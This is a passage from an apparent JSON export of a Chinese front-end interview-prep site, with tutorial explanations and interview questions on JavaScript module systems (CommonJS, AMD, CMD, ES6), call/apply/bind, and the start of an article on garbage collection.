③定义模块代码(同服务器端)\n\n注意：`index.html`文件要运行在浏览器上，需要借助browserify将`app.js`文件打包编译，如果直接在`index.html`引入`app.js`就会报错！\n\n#### ④打包处理js\n\n根目录下运行`browserify js/src/app.js -o js/dist/bundle.js`\n\n#### ⑤页面使用引入\n\n在index.html文件中引入`<script type=\"text/javascript\" src=\"js/dist/bundle.js\"></script>`\n\n### 2.AMD\n\nCommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数。由于Node.js主要用于服务器编程，模块文件一般都已经存在于本地硬盘，所以加载起来比较快，不用考虑非同步加载的方式，所以CommonJS规范比较适用。但是，**如果是浏览器环境，要从服务器端加载模块，这时就必须采用非同步模式，因此浏览器端一般采用AMD规范**。此外AMD规范比CommonJS规范在浏览器端实现要来着早。\n\n#### (1)AMD规范基本语法\n\n**定义暴露模块**:\n\n```bash\n//定义没有依赖的模块\ndefine(function(){\n   return 模块\n})\n```\n\n```bash\n//定义有依赖的模块\ndefine(['module1', 'module2'], function(m1, m2){\n   return 模块\n})\n```\n\n**引入使用模块**:\n\n```bash\nrequire(['module1', 'module2'], function(m1, m2){\n   使用m1/m2\n})\n```\n\n#### (2)未使用AMD规范与使用require.js\n\n通过比较两者的实现方法，来说明使用AMD规范的好处。\n\n-   未使用AMD规范\n\n```bash\n// dataService.js文件\n(function (window) {\n  let msg = 'www.baidu.com'\n  function getMsg() {\n    return msg.toUpperCase()\n  }\n  window.dataService = {getMsg}\n})(window)\n```\n\n```bash\n// alerter.js文件\n(function (window, dataService) {\n  let name = 'Tom'\n  function showMsg() {\n    alert(dataService.getMsg() + ', ' + name)\n  }\n  window.alerter = {showMsg}\n})(window, dataService)\n```\n\n```bash\n// main.js文件\n(function (alerter) {\n  alerter.showMsg()\n})(alerter)\n```\n\n```bash\n// index.html文件\n<div><h1>Modular Demo 1: 未使用AMD(require.js)</h1></div>\n<script type=\"text/javascript\" src=\"js/modules/dataService.js\"></script>\n<script type=\"text/javascript\" src=\"js/modules/alerter.js\"></script>\n<script type=\"text/javascript\" src=\"js/main.js\"></script>\n```\n\n最后得到如下结果：\n\n![](https://static.ecool.fun//article/fa400c15-f32c-4c2a-b666-49b111f54f1e.png)\n\n这种方式缺点很明显：**首先会发送多个请求，其次引入的js文件顺序不能搞错，否则会报错！**\n\n-   使用require.js\n\nRequireJS是一个工具库，主要用于客户端的模块管理。它的模块管理遵守AMD规范，**RequireJS的基本思想是，通过define方法，将代码定义为模块；通过require方法，实现代码的模块加载**。 接下来介绍AMD规范在浏览器实现的步骤：\n\n#### ①下载require.js, 并引入\n\n-   官网: `http://www.requirejs.cn/`\n-   github : `https://github.com/requirejs/requirejs`\n\n然后将require.js导入项目: js/libs/require.js\n\n#### ②创建项目结构\n\n```bash\n|-js\n  |-libs\n    |-require.js\n  |-modules\n    |-alerter.js\n    |-dataService.js\n  |-main.js\n|-index.html\n```\n\n#### ③定义require.js的模块代码\n\n```bash\n// dataService.js文件\n// 定义没有依赖的模块\ndefine(function() {\n  let msg = 'www.baidu.com'\n  function getMsg() {\n    return msg.toUpperCase()\n  }\n  return { getMsg } // 暴露模块\n})\n```\n\n```bash\n//alerter.js文件\n// 定义有依赖的模块\ndefine(['dataService'], function(dataService) {\n  let name = 'Tom'\n  function showMsg() {\n    alert(dataService.getMsg() + ', ' + name)\n  }\n  // 暴露模块\n  return { showMsg }\n})\n```\n\n```bash\n// main.js文件\n(function() {\n  require.config({\n    baseUrl: 'js/', //基本路径 出发点在根目录下\n    paths: {\n      //映射: 模块标识名: 路径\n      alerter: './modules/alerter', //此处不能写成alerter.js,会报错\n      dataService: './modules/dataService'\n    }\n  })\n  require(['alerter'], function(alerter) {\n    alerter.showMsg()\n  })\n})()\n```\n\n```bash\n// index.html文件\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Modular Demo</title>\n  </head>\n  <body>\n    <!-- 引入require.js并指定js主文件的入口 -->\n    <script data-main=\"js/main\" src=\"js/libs/require.js\"></script>\n  </body>\n</html>\n```\n\n#### ④页面引入require.js模块:\n\n在index.html引入 `<script data-main=\"js/main\" src=\"js/libs/require.js\"></script>`\n\n**此外在项目中如何引入第三方库**？只需在上面代码的基础稍作修改：\n\n```bash\n// alerter.js文件\ndefine(['dataService', 'jquery'], function(dataService, $) {\n  let name = 'Tom'\n  function showMsg() {\n    alert(dataService.getMsg() + ', ' + name)\n  }\n  $('body').css('background', 'green')\n  // 暴露模块\n  return { showMsg }\n})\n```\n\n```bash\n// main.js文件\n(function() {\n  require.config({\n    baseUrl: 'js/', //基本路径 出发点在根目录下\n    paths: {\n      //自定义模块\n      alerter: './modules/alerter', //此处不能写成alerter.js,会报错\n      dataService: './modules/dataService',\n      // 第三方库模块\n      jquery: './libs/jquery-1.10.1' //注意：写成jQuery会报错\n    }\n  })\n  require(['alerter'], function(alerter) {\n    alerter.showMsg()\n  })\n})()\n```\n\n上例是在alerter.js文件中引入jQuery第三方库，main.js文件也要有相应的路径配置。 **小结**：通过两者的比较，可以得出**AMD模块定义的方法非常清晰，不会污染全局环境，能够清楚地显示依赖关系**。AMD模式可以用于浏览器环境，并且允许非同步加载模块，也可以根据需要动态加载模块。\n\n### 3.CMD\n\nCMD规范专门用于浏览器端，模块的加载是异步的，模块使用时才会加载执行。CMD规范整合了CommonJS和AMD规范的特点。在 Sea.js 中，所有 JavaScript 模块都遵循 CMD模块定义规范。\n\n#### (1)CMD规范基本语法\n\n**定义暴露模块：**\n\n```bash\n//定义没有依赖的模块\ndefine(function(require, exports, module){\n  exports.xxx = value\n  module.exports = value\n})\n```\n\n```bash\n//定义有依赖的模块\ndefine(function(require, exports, module){\n  //引入依赖模块(同步)\n  var module2 = require('./module2')\n  //引入依赖模块(异步)\n    require.async('./module3', function (m3) {\n    })\n  //暴露模块\n  exports.xxx = value\n})\n```\n\n**引入使用模块：**\n\n```bash\ndefine(function (require) {\n  var m1 = require('./module1')\n  var m4 = require('./module4')\n  m1.show()\n  m4.show()\n})\n```\n\n#### (2)sea.js简单使用教程\n\n#### ①下载sea.js, 并引入\n\n-   官网: [seajs.org/](http://seajs.org/ \"http://seajs.org/\")\n-   github : [github.com/seajs/seajs](https://github.com/seajs/seajs \"https://github.com/seajs/seajs\")\n\n然后将sea.js导入项目: js/libs/sea.js\n\n#### ②创建项目结构\n\n```bash\n|-js\n  |-libs\n    |-sea.js\n  |-modules\n    |-module1.js\n    |-module2.js\n    |-module3.js\n    |-module4.js\n    |-main.js\n|-index.html\n```\n\n#### ③定义sea.js的模块代码\n\n```bash\n// module1.js文件\ndefine(function (require, exports, module) {\n  //内部变量数据\n  var data = 'atguigu.com'\n  //内部函数\n  function show() {\n    console.log('module1 show() ' + data)\n  }\n  //向外暴露\n  exports.show = show\n})\n```\n\n```bash\n// module2.js文件\ndefine(function (require, exports, module) {\n  module.exports = {\n    msg: 'I Will Back'\n  }\n})\n```\n\n```bash\n// module3.js文件\ndefine(function(require, exports, module) {\n  const API_KEY = 'abc123'\n  exports.API_KEY = API_KEY\n})\n```\n\n```bash\n// module4.js文件\ndefine(function (require, exports, module) {\n  //引入依赖模块(同步)\n  var module2 = require('./module2')\n  function show() {\n    console.log('module4 show() ' + module2.msg)\n  }\n  exports.show = show\n  //引入依赖模块(异步)\n  require.async('./module3', function (m3) {\n    console.log('异步引入依赖模块3  ' + m3.API_KEY)\n  })\n})\n```\n\n```bash\n// main.js文件\ndefine(function (require) {\n  var m1 = require('./module1')\n  var m4 = require('./module4')\n  m1.show()\n  m4.show()\n})\n```\n\n#### ④在index.html中引入\n\n```bash\n<script type=\"text/javascript\" src=\"js/libs/sea.js\"></script>\n<script type=\"text/javascript\">\n  seajs.use('./js/modules/main')\n</script>\n```\n\n最后得到结果如下：\n\n![](https://static.ecool.fun//article/d76f003b-4ffc-44e8-a957-af1a9c16cc0d.png)\n\n### 4.ES6模块化\n\nES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。CommonJS 和 AMD 模块，都只能在运行时确定这些东西。比如，CommonJS 模块就是对象，输入时必须查找对象属性。\n\n#### (1)ES6模块化语法\n\nexport命令用于规定模块的对外接口，import命令用于输入其他模块提供的功能。\n\n```bash\n/** 定义模块 math.js **/\nvar basicNum = 0;\nvar add = function (a, b) {\n    return a + b;\n};\nexport { basicNum, add };\n/** 引用模块 **/\nimport { basicNum, add } from './math';\nfunction test(ele) {\n    ele.textContent = add(99 + basicNum);\n}\n```\n\n如上例所示，使用import命令的时候，用户需要知道所要加载的变量名或函数名，否则无法加载。为了给用户提供方便，让他们不用阅读文档就能加载模块，就要用到export default命令，为模块指定默认输出。\n\n```bash\n// export-default.js\nexport default function () {\n  console.log('foo');\n}\n```\n\n```bash\n// import-default.js\nimport customName from './export-default';\ncustomName(); // 'foo'\n```\n\n模块默认输出, 其他模块加载该模块时，import命令可以为该匿名函数指定任意名字。\n\n#### (2)ES6 模块与 CommonJS 模块的差异\n\n它们有两个重大差异：\n\n**① CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用**。\n\n**② CommonJS 模块是运行时加载，ES6 模块是编译时输出接口**。\n\n第二个差异是因为 CommonJS 加载的是一个对象（即module.exports属性），该对象只有在脚本运行完才会生成。而 ES6 模块不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成。\n\n下面重点解释第一个差异，我们还是举上面那个CommonJS模块的加载机制例子:\n\n```bash\n// lib.js\nexport let counter = 3;\nexport function incCounter() {\n  counter++;\n}\n// main.js\nimport { counter, incCounter } from './lib';\nconsole.log(counter); // 3\nincCounter();\nconsole.log(counter); // 4\n```\n\nES6 模块的运行机制与 CommonJS 不一样。**ES6 模块是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块**。\n\n#### (3) ES6-Babel-Browserify使用教程\n\n简单来说就一句话：**使用Babel将ES6编译为ES5代码，使用Browserify编译打包js**。\n\n#### ①定义package.json文件\n\n```bash\n {\n   \"name\" : \"es6-babel-browserify\",\n   \"version\" : \"1.0.0\"\n }\n```\n\n#### ②安装babel-cli, babel-preset-es2015和browserify\n\n-   npm install babel-cli browserify -g\n-   npm install babel-preset-es2015 --save-dev\n-   preset 预设(将es6转换成es5的所有插件打包)\n\n#### ③定义.babelrc文件\n\n```bash\n  {\n    \"presets\": [\"es2015\"]\n  }\n```\n\n#### ④定义模块代码\n\n```bash\n//module1.js文件\n// 分别暴露\nexport function foo() {\n  console.log('foo() module1')\n}\nexport function bar() {\n  console.log('bar() module1')\n}\n```\n\n```bash\n//module2.js文件\n// 统一暴露\nfunction fun1() {\n  console.log('fun1() module2')\n}\nfunction fun2() {\n  console.log('fun2() module2')\n}\nexport { fun1, fun2 }\n```\n\n```bash\n//module3.js文件\n// 默认暴露 可以暴露任意数据类项，暴露什么数据，接收到就是什么数据\nexport default () => {\n  console.log('默认暴露')\n}\n```\n\n```bash\n// app.js文件\nimport { foo, bar } from './module1'\nimport { fun1, fun2 } from './module2'\nimport module3 from './module3'\nfoo()\nbar()\nfun1()\nfun2()\nmodule3()\n```\n\n#### ⑤ 编译并在index.html中引入\n\n-   使用Babel将ES6编译为ES5代码(但包含CommonJS语法) : `babel js/src -d js/lib`\n-   使用Browserify编译js : `browserify js/lib/app.js -o js/lib/bundle.js`\n\n然后在index.html文件中引入\n\n```bash\n <script type=\"text/javascript\" src=\"js/lib/bundle.js\"></script>\n```\n\n最后得到如下结果：\n\n![](https://static.ecool.fun//article/0a2e00de-73e1-44ea-bfb4-eaee4d5e05d1.png)\n\n**此外第三方库(以jQuery为例)如何引入呢**？ 首先安装依赖`npm install jquery@1` 然后在app.js文件中引入\n\n```bash\n//app.js文件\nimport { foo, bar } from './module1'\nimport { fun1, fun2 } from './module2'\nimport module3 from './module3'\nimport $ from 'jquery'\n\nfoo()\nbar()\nfun1()\nfun2()\nmodule3()\n$('body').css('background', 'green')\n```\n\n## 三、总结\n\n-   CommonJS规范主要用于服务端编程，加载模块是同步的，这并不适合在浏览器环境，因为同步意味着阻塞加载，浏览器资源是异步加载的，因此有了AMD CMD解决方案。\n-   AMD规范在浏览器环境中异步加载模块，而且可以并行加载多个模块。不过，AMD规范开发成本高，代码的阅读和书写比较困难，模块定义方式的语义不顺畅。\n-   CMD规范与AMD规范很相似，都用于浏览器编程，依赖就近，延迟执行，可以很容易在Node.js中运行。不过，依赖SPM 打包，模块的加载逻辑偏重\n-   **ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案**。\n",
    "testPoint": "### 1. **模块化的基本概念**\n   - 什么是模块化编程？模块化在开发中的优势是什么？\n   - 你可以举一个例子说明什么是一个模块吗？模块如何提高代码的可维护性和复用性？\n\n### 2. **CommonJS、AMD 和 ES Modules**\n   - 什么是 CommonJS、AMD 和 ES Modules？它们的主要区别是什么？\n   - 你能描述一下 ES6 模块化的语法吗？例如，`import` 和 `export` 的用法。\n   - 在 Node.js 中使用的模块化系统是 CommonJS，它如何导出和引入模块？请解释 `module.exports` 和 `require`。\n\n### 3. **ES6 模块化与打包工具**\n   - 在使用 ES6 模块化时，如何使用 `import` 和 `export` 来共享和导入模块？\n   - 你如何理解默认导出（`export default`）和命名导出（`export`）的区别？在什么场景下使用各自？\n   - 打包工具（如 Webpack、Rollup 等）如何处理模块化？它们如何优化模块的加载和打包？\n\n### 4. **模块的依赖管理**\n   - 模块间依赖是如何管理的？你如何避免循环依赖问题？\n   - 当你引入大量外部依赖时，如何确保模块化结构的清晰与高效？\n\n### 5. **懒加载与动态导入**\n   - 什么是懒加载（Lazy Loading）？它在模块化中的作用是什么？\n   - `import()` 动态导入是如何工作的？请描述它的应用场景，例如按需加载模块。\n\n### 6. **模块化与代码拆分**\n   - 你如何使用模块化进行代码拆分（Code Splitting）？代码拆分如何提高前端性能？\n   - 在 Webpack 中如何实现代码拆分？你如何配置和优化代码拆分？\n\n### 7. **前后端模块化的差异**\n   - 在前端和后端开发中，模块化的实现方式有何不同？你在前后端项目中是如何处理模块化的？\n   - 对于前端开发，如何使用模块化来提升可维护性和可扩展性？\n\n### 8. **模块化的最佳实践**\n   - 在实际项目中，你是如何组织模块和文件结构的？\n   - 你如何确保模块间的解耦？例如，如何避免一个模块过于依赖其他模块？\n\n### 9. **模块化与性能**\n   - 模块化可能对性能产生哪些影响？如何平衡模块化的可维护性和页面加载性能？\n   - 如何通过优化模块化的使用（如 Tree Shaking、按需加载等）来提升应用的性能？\n\n### 10. **实践中的模块化经验**\n   - 请分享你在项目中如何实现模块化的经验。遇到过哪些挑战，如何解决？\n   - 在使用模块化开发时，是否曾遇到过性能问题或其他技术难题？你是如何解决的？\n",
    "exerciseKeyList": "[\"f5f2f81e-c0c8-409e-ba00-3f3428ae535b\",\"8ecafda7-0ae6-40bd-b8c6-385d02fa7165\",\"6227d54d-4d71-47fb-9c72-359632847778\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 14,
    "createAt": "2024-10-01T13:08:21.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "6227d54d-4d71-47fb-9c72-359632847778",
        "title": "为什么Node在使用es module时必须加上文件扩展名?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-05-14T03:21:35.000Z",
        "updateAt": "2024-08-10T19:54:51.000Z"
      },
      {
        "exerciseKey": "8ecafda7-0ae6-40bd-b8c6-385d02fa7165",
        "title": "说说你对JS的模块化方案的了解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-03T05:30:11.000Z",
        "updateAt": "2024-08-10T17:06:47.000Z"
      },
      {
        "exerciseKey": "f5f2f81e-c0c8-409e-ba00-3f3428ae535b",
        "title": "说说你对模块化方案的理解，比如 CommonJS、AMD、CMD、ES Module 分别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:42:00.000Z",
        "updateAt": "2024-08-10T17:07:03.000Z"
      }
    ]
  },
  "22": {
    "id": 22,
    "tagId": 10,
    "title": "call、apply和bind",
    "explanation": "## `apply` 和 `call`简介\n\n\n在 `javascript` 中，`call` 和 `apply` 都是为了改变某个函数运行时的上下文（`context`）而存在的，换句话说，就是为了改变函数体内部 `this` 的指向。\n\n\n\n`JavaScript` 的一大特点是，函数存在「`定义时上下文`」和「`运行时上下文`」以及「`上下文是可以改变的`」这样的概念。\n\n\n\n比如 `A` 对象有一个方法，而 `B` 对象因为某种原因，也需要用到同样的方法，那么这时候不用单独为 `B` 对象扩展一个方法，可以直接借用 A 对象的方法。这样既完成了需求，又减少了内存的占用。\n\n\n\n直接来看个例子：\n\n\n\n```plain\nfunction fruits() {} fruits.prototype = {    color: \"red\",    say: function() {        console.log(\"My color is \" + this.color);    }} var apple = new fruits();apple.say();    //My color is red\n```\n\n\n\n但是如果我们有一个对象 `banana= {color : \"yellow\"}` ,我们不想对它重新定义 `say` 方法，那么我们可以通过 `call` 或 `apply` 用 `apple` 的 `say` 方法：\n\n\n\n```plain\nbanana = {    color: \"yellow\"}apple.say.call(banana);     //My color is yellowapple.say.apply(banana);    //My color is yellow\n```\n\n\n\n## apply、call 的区别\n\n\n对于 apply、call 二者而言，作用完全一样，只是接受参数的方式不太一样。例如，有一个函数定义如下：\n\n\n\n```plain\nvar func = function(arg1, arg2) {\n     \n};\n```\n\n\n\n就可以通过如下方式来调用：\n\n\n\n```plain\nfunc.call(this, arg1, arg2)\nfunc.apply(this, [arg1, arg2])\n```\n\n\n\n其中 `this` 想指定的上下文，可以是任何一个 `JavaScript` 对象(`JavaScript` 中一切皆对象)，`call` 需要把参数按顺序传递进去，而 `apply` 则是把参数放在数组里。\n\n\n\n`JavaScript` 中，某个函数的参数数量是不固定的，因此要说适用条件的话，当你的参数是明确知道数量时用 `call` 。\n\n\n\n而不确定的时候用 `apply`，然后把参数 `push` 进数组传递进去。当参数数量不确定时，函数内部也可以通过 `arguments` 这个伪数组来遍历所有的参数。\n\n\n\n## apply、call 的常见用法\n\n\n+ 数组之间追加\n\n\n\n在 `ES6` 的扩展运算符出现之前，我们可以用 `Array.prototype.push` 来实现\n\n\n\n```plain\nvar array1 = [12 , \"foo\" , {name \"Joe\"} , -2458]; \nvar array2 = [\"Doe\" , 555 , 100]; \nArray.prototype.push.apply(array1, array2); \n/* array1 值为  [12 , \"foo\" , {name \"Joe\"} , -2458 , \"Doe\" , 555 , 100] */\n```\n\n\n\nES6 中可以使用 `[...array1, ...array2]` 实现。\n\n\n\n+ 获取数组中的最大值和最小值\n\n\n\nnumber 本身没有 max 方法，但是 Math 有，我们可以借助 `call` 或者 `apply` 使用其方法。\n\n\n\n```plain\nvar  numbers = [5, 458 , 120 , -215 ]; \nvar maxInNumbers = Math.max.apply(Math, numbers),   //458\n    maxInNumbers = Math.max.call(Math,5, 458 , 120 , -215); //458\n```\n\n\n\n+ 验证是否是数组（前提是toString()方法没有被重写过）\n\n\n\n```plain\nfunction isArray(obj){ \n    return Object.prototype.toString.call(obj) === '[object Array]' ;\n}\n```\n\n\n\n+ 类（伪）数组使用数组方法\n\n\n\nJavascript中存在一种名为**伪数组**的对象结构。比较特别的是 `arguments` 对象，还有像调用 `getElementsByTagName` , `document.childNodes` 之类的，它们返回 `NodeList` 对象都属于伪数组。不能调用 `Array` 下的 `push` , `pop` 等方法。\n\n\n\n但是我们能通过 `Array.prototype.slice.call` 转换为真正的数组的带有 `length` 属性的对象，这样 `domNodes` 就可以应用 `Array` 下的所有方法了。\n\n\n\n```plain\nvar domNodes = Array.prototype.slice.call(document.getElementsByTagName(\"*\"));\n```\n\n\n\n+ 继承\n\n\n\n```plain\nfunction Animal(name){\n    this.name = name;\n    this.showName = function(){\n        console.log(this.name);\n    }\n}\n\nfunction Cat(name){\n    Animal.call(this, name);\n}\n```\n\n\n\n## 一道面试题\n\n\n下面就借用一道面试题，让大家更深入理解 `apply` 和 `call` 。\n\n\n\n定义一个 log 方法，让它可以代理 `console.log` 方法，并且每个log消息添加一个\"`(面试题宝典)`\"的前缀。\n\n\n\n大家可能会想到下面这个方法：\n\n\n\n```plain\nfunction log(msg) {\n  console.log(`(面试题宝典)${msg}`);\n}\n\nlog(1);    //1\nlog(1,2);    //1\n```\n\n\n\n但是对于传入的参数数量不确定时，这个方法不能将传入的参数全部打印出来。这个时候就可以考虑使用 `apply` 或者 `call`，注意这里传入多少个参数是不确定的，所以使用apply是最好的，方法如下：\n\n\n\n```plain\nfunction log(){\n  var args = Array.prototype.slice.call(arguments);\n  args.unshift('(面试题宝典)');\n  console.log.apply(console, arguments);\n};\nlog(1);    //1\nlog(1,2);    //1 2\n```\n\n\n\n## bind\n\n\n我们再来说说 `bind`。\n\n\n\n`bind()` 方法与 `apply` 和 `call` 很相似，也是可以改变函数体内 `this` 的指向。\n\n\n\nMDN的解释是：\n\n\n\n> `bind()` 方法创建一个新的函数，在 `bind()` 被调用时，这个新函数的 `this` 被指定为 `bind()` 的第一个参数，而其余参数将作为新函数的参数，供调用时使用。\n>\n\n\n\n语法：\n\n\n\n> function.bind(thisArg[, arg1[, arg2[, ...]]])\n>\n\n\n\n`bind` **不是**立即调用函数，而是返回一个新的函数。\n\n\n\n还有一点，如果 `bind` 函数的参数列表为空，或者第一个参数是 `null` 或 `undefined`，执行作用域的 `this` 将被视为新函数的 `thisArg`。`apply` 和 `call` 则是如果这个函数处于非严格模式下，则指定为 `null` 或 `undefined` 时会自动替换为指向全局对象，原始值会被包装。\n\n\n\n我们来看一个 `bind` 的例子：\n\n\n\n```plain\nthis.x = 9;    // 在浏览器中，this 指向全局的 \"window\" 对象\nvar module = {\n  x: 81,\n  getX: function() { return this.x; }\n};\n\nmodule.getX(); // 81\n\nvar retrieveX = module.getX;\nretrieveX();\n// 返回 9 - 因为函数是在全局作用域中调用的\n\n// 创建一个新函数，把 'this' 绑定到 module 对象\n// 新手可能会将全局变量 x 与 module 的属性 x 混淆\nvar boundGetX = retrieveX.bind(module);\nboundGetX(); // 81\n```\n\n\n\n还有个有趣的问题，如果连续 `bind()` 多次，会有什么效果呢？像这样：\n\n\n\n```plain\nvar bar = function(){\n    console.log(this.x);\n}\nvar foo = {\n    x:3\n}\nvar sed = {\n    x:4\n}\nvar func = bar.bind(foo).bind(sed);\nfunc(); //?\n \nvar fiv = {\n    x:5\n}\nvar func = bar.bind(foo).bind(sed).bind(fiv);\nfunc(); //?\n```\n\n\n\n答案是，两次都输出 **3** ，而非期待中的 4 和 5 。原因是多次 bind() 是无效的。更深层次的原因与 `bind()` 的实现有关，相当于使用函数在内部包了一个 `call / apply` ，第二次 `bind()` 相当于再包住第一次 `bind()`，故第二次以后的 `bind` 是无法生效的。\n\n",
    "testPoint": "### 1. **`call`、`apply` 和 `bind` 的基本概念**\n   - 你能解释一下 `call`、`apply` 和 `bind` 的作用吗？它们有什么共同点和不同点？\n   - 它们都用于改变函数的 `this` 指向，能否举一个简单的例子说明它们的用法？\n\n### 2. **`call` 和 `apply` 的区别**\n   - `call` 和 `apply` 的参数传递方式有什么不同？如何理解这两者的区别？\n   - 请举一个例子，演示如何使用 `call` 和 `apply` 来调用一个函数并改变 `this` 的指向。\n\n### 3. **`bind` 的工作原理**\n   - `bind` 是如何工作的？它与 `call` 和 `apply` 有什么区别？\n   - `bind` 返回的是一个新的函数，为什么它不会立即执行？它是如何绑定 `this` 的？\n\n### 4. **`this` 和 `call`/`apply`/`bind` 的关系**\n   - 你能描述一下如何使用 `call` 和 `apply` 来改变 `this` 的指向吗？比如，在事件处理函数或回调函数中。\n   - 在 `bind` 中，`this` 是如何永久绑定的？与 `call`/`apply` 不同，`bind` 为什么需要返回一个新的函数？\n\n### 5. **应用场景与实际问题**\n   - `call` 和 `apply` 如何用来借用其他对象的方法？举个例子说明。\n   - 请举例说明你在项目中如何使用 `bind` 来绑定 `this`，特别是在事件处理或回调函数中。\n   - 在使用 `call`、`apply` 或 `bind` 时，你是否遇到过 `this` 绑定错误的情况？如何调试和解决这个问题？\n\n### 6. **`bind` 的偏函数应用**\n   - 你如何使用 `bind` 实现偏函数（Partial Application）？请举例说明。\n   - 偏函数和柯里化（Currying）有什么区别？它们在实际开发中如何配合使用？\n\n### 7. **性能与优化**\n   - `bind` 返回的新函数可能会影响性能，特别是在大量绑定的情况下，你如何优化这种性能问题？\n   - 如果你需要频繁地改变 `this`，你会选择 `call`、`apply` 还是 `bind`？为什么？\n\n### 8. **特殊情况：箭头函数**\n   - 箭头函数的 `this` 与 `call`、`apply`、`bind` 有什么关系？为什么箭头函数不需要这些方法来改变 `this` 指向？\n   - 你如何在回调函数中使用箭头函数以避免 `this` 指向错误？\n",
    "exerciseKeyList": "[\"8d391a9c-0573-4edd-bd5d-84b9af70bad5\",\"827a8f47-1144-4ab1-9d6c-b7d3b3d6aebf\",\"c8245703-a177-4deb-a8be-24f73a3267b8\",\"d0625555-2b53-4edc-bf3f-2721eaf7af55\",\"b9bab51e-ab87-400a-9284-b996e853ecec\",\"e253151b-a880-448b-9cd1-d869971a63e4\",\"c6c4c722-bd37-41dd-b736-e836260b7863\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 18,
    "createAt": "2024-10-01T13:18:40.000Z",
    "updateAt": "2024-11-08T14:41:13.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "827a8f47-1144-4ab1-9d6c-b7d3b3d6aebf",
        "title": "实现 Function.prototype.call",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:02:36.000Z",
        "updateAt": "2021-07-07T00:13:01.000Z"
      },
      {
        "exerciseKey": "8d391a9c-0573-4edd-bd5d-84b9af70bad5",
        "title": "bind、call、apply 有什么区别？如何实现一个bind?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:55:41.000Z",
        "updateAt": "2024-08-10T21:45:06.000Z"
      },
      {
        "exerciseKey": "b9bab51e-ab87-400a-9284-b996e853ecec",
        "title": "连续 bind()多次，输出的值是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-05T12:43:31.000Z",
        "updateAt": "2022-06-05T20:43:37.000Z"
      },
      {
        "exerciseKey": "c6c4c722-bd37-41dd-b736-e836260b7863",
        "title": "实现 Function.prototype.bind",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:03:00.000Z",
        "updateAt": "2021-07-07T00:13:04.000Z"
      },
      {
        "exerciseKey": "c8245703-a177-4deb-a8be-24f73a3267b8",
        "title": "实现 Function.prototype.apply()",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:02:12.000Z",
        "updateAt": "2025-08-26T09:01:04.000Z"
      },
      {
        "exerciseKey": "d0625555-2b53-4edc-bf3f-2721eaf7af55",
        "title": "解释下如下代码的意图：Array.prototype.slice.apply(arguments)",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-12-26T03:44:35.000Z",
        "updateAt": "2021-12-26T16:05:46.000Z"
      },
      {
        "exerciseKey": "e253151b-a880-448b-9cd1-d869971a63e4",
        "title": "bind() 连续调用多次，this的绑定值是什么呢？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-10T03:04:35.000Z",
        "updateAt": "2021-08-15T15:28:30.000Z"
      }
    ]
  },
  "23": {
    "id": 23,
    "tagId": 10,
    "title": "垃圾回收",
    "explanation": "## 写在前面\n\n我们知道垃圾回收机制是引擎来做的，JS引擎有很多种（各个浏览器都不同），其垃圾回收机制在一些细节及优化上略有不同，本文我们以一些通用的回收算法作为切入，再由 V8 引擎发展至今对该机制的优化为例（为什么以 V8 为例？因为它市场占有率大 😄 ），一步一步深入来助我们了解垃圾回收机制，因为只有真正了解垃圾回收机制，后面才能理解内存泄漏的问题以及手动预防和优化\n\nJavaScript 是门魅力无限的语言，关于它的 GC（垃圾回收）方面，你了解多少呢？想来大部分人是因为面试才去看一些面试题从而了解的垃圾回收，那在正式开始之前，给大家列几个小问题，大家可以先想一下答案，带着问题及答案再去看文章，最后读完此文如果你的答案可以优化，即有收获\n\n* 什么是垃圾回收机制？\n* 垃圾是怎样产生的？\n* 为什么要进行垃圾回收？\n* 垃圾回收是怎样进行的？\n* V8 引擎对垃圾回收进行了哪些优化？\n\n当然，我们可不仅仅是为了面试，其目的是一次性彻底搞懂 GC！\n\n## GC是什么\n\n`GC` 即 `Garbage Collection` ，程序工作过程中会产生很多 `垃圾`，这些垃圾是程序不用的内存或者是之前用过了，以后不会再用的内存空间，而 `GC` 就是负责回收垃圾的，因为他工作在引擎内部，所以对于我们前端来说，`GC` 过程是相对比较无感的，这一套引擎执行而对我们又相对无感的操作也就是常说的 `垃圾回收机制` 了\n\n当然也不是所有语言都有 `GC`，一般的高级语言里面会自带 `GC`，比如 `Java、Python、JavaScript` 等，也有无 `GC` 的语言，比如 `C、C++` 等，那这种就需要我们程序员手动管理内存了，相对比较麻烦\n\n## 垃圾产生&为何回收\n\n我们知道写代码时创建一个基本类型、对象、函数……都是需要占用内存的，但是我们并不关注这些，因为这是引擎为我们分配的，我们不需要显式手动的去分配内存\n\n但是，你有没有想过，当我们不再需要某个东西时会发生什么？JavaScript 引擎又是如何发现并清理它的呢？\n\n我们举个简单的例子\n\n```js\nlet test = {\n  name: \"isboyjc\"\n};\ntest = [1,2,3,4,5]\n```\n\n如上所示，我们假设它是一个完整的程序代码\n\n我们知道 `JavaScript` 的引用数据类型是保存在堆内存中的，然后在栈内存中保存一个对堆内存中实际对象的引用，所以，`JavaScript` 中对引用数据类型的操作都是操作对象的引用而不是实际的对象。可以简单理解为，栈内存中保存了一个地址，这个地址和堆内存中的实际值是相关的\n\n那上面代码首先我们声明了一个变量 